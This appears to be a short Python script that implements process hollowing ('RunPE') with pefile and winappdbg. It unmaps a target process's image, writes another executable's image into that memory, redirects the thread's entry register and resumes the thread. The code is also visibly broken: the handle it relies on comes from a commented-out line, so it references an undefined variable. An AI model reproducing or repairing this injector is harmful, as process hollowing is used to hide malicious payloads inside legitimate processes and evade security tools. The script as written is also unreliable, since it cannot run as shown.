import sys
import pefile
from ctypes import *
from winappdbg import *
CREATE_SUSPENDED = 0x4

def RunPE():
    pid, eFile = int(sys.argv[1]), sys.argv[2]

    #hHandle = win32.kernel32.CreateProcess(gFile, dwCreationFlags=CREATE_SUSPENDED)
    hProcess = Process(pid)
    hThread = Thread(hHandle.dwThreadId)
    hPeb = hProcess.get_peb()
    pe = pefile.PE(eFile)
    data = pe.get_memory_mapped_image()
    szdata = len(data)

    windll.ntdll.NtUnmapViewOfSection(hHandle.hProcess, hPeb.ImageBaseAddress)
    win32.kernel32.VirtualAllocEx(hHandle.hProcess, hPeb.ImageBaseAddress, szdata)
    win32.kernel32.WriteProcessMemory(hHandle.hProcess, hPeb.ImageBaseAddress, data)
    hThread.set_register("Eax", pe.OPTIONAL_HEADER.ImageBase + pe.OPTIONAL_HEADER.AddressOfEntryPoint)
    raw_input("pause ...")
    hThread.resume()

if __name__ == "__main__":
    System.request_debug_privileges()
    RunPE()